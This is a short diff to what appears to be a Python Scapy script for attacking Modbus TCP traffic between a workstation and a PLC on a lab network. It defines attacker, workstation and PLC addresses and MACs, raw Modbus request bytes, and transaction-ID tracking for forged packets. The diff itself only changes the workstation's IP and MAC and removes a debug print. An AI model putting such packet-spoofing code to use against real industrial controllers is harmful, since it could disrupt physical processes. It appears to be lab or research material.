@@ -7,11 +7,11 @@ Transaction_ID = 0
 # Read discrete input is the first query in the loop
 # Read discrete input hex '00 00 00 06 01 02 00 00 00 03'
 attacker = "192.168.88.201"
-workstation = "192.168.88.202"
+workstation = "192.168.88.204"
 plc = "192.168.88.10"
 interface = "eth0"
 MAC_PLC = "a6:83:e7:d3:3f:64"
-MAC_WORKSTATION = "08:00:27:1d:d0:b5"
+MAC_WORKSTATION = "08:00:27:FF:CA:89"
 MAC_ATTACKER = "08:00:27:88:85:88"
 discrete_read_hex = "\\x00\\x00\\x00\\x06\\x01\\x02\\x00\\x00\\x00\\x03"
 holding_read_hex = "\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x01\\x00\\x02"
@@ -27,7 +27,6 @@ while (True):
 
     Transaction_str = str(READ_DISCRETE[Raw].load.hex())[0:-20]
     Transaction_ID = int(Transaction_str,16) + 4
-    print(Transaction_ID)
 
     # Modbus Layer Definition
     class ModbusTCP(Packet):
